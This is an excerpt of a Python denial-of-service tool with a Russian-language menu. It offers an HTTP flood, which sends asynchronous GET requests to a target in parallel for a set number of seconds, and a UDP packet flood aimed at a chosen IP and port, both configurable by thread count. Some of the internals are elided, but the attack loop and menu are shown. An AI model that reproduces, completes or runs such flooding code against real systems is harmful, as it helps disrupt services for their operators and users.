...
async def http_attack(target, duration, threads):
        ...
        while time.time() < end_time:
            try:
                async with session.get(target, headers=headers) as response:
                    print(Colorate.Horizontal(Colors.blue_to_green, f"HTTP(s) {response.status} -> {target}"))
            except:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"Ошибка! {target}"))

    end_time = time.time() + duration
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(threads)]
    ...
    async def send_packet():
        ...
        while time.time() < end_time:
            try:
                ...
                print(Colorate.Horizontal(Colors.blue_to_green, f"UDP Пакет -> {ip}:{port}"))
            except:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"Ошибка! -> {ip}:{port} "))
...
def main_menu():
    while True:
        ...
        if choice == "1":
            ...
            duration = int(input(Colorate.Horizontal(Colors.green_to_blue, "Введите длительность атаки (секунды): ")))
            threads = int(input(Colorate.Horizontal(Colors.green_to_blue, "Введите кол-во потоков: ")))
            asyncio.run(http_attack(target, duration, threads))

        elif choice == "2":
            ip = input(Colorate.Horizontal(Colors.green_to_blue, "\nВведите IP-адрес: "))
            port = int(input(Colorate.Horizontal(Colors.green_to_blue, "Введите порт (80, 443, 8080..): ")))
            duration = int(input(Colorate.Horizontal(Colors.green_to_blue, "Введите длительность атаки (секунды): ")))
            threads = int(input(Colorate.Horizontal(Colors.green_to_blue, "Введите кол-во потоков: ")))
